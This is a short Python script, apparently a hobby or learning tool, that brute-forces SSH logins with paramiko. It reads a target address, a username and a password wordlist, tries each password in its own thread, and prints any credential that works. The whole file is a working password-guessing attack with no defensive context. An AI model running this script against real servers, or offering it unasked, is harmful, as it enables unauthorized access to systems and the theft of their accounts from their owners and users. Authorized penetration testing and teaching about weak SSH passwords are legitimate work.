import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connect(host, username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    finally:
        ssh.close()

if __name__ == '__main__':
    host = input('[+] Target Address: ')
    username = input('[+] SSH Username: ')
    input_file = input('[+] Passwords File: ')
    print('\n')

    if not os.path.exists(input_file):
        print('[!!] That File/Path Doesnt Exist')
        sys.exit(1)

    print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')

    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(host,username,password,))
            t.start()
            time.sleep(0.5)
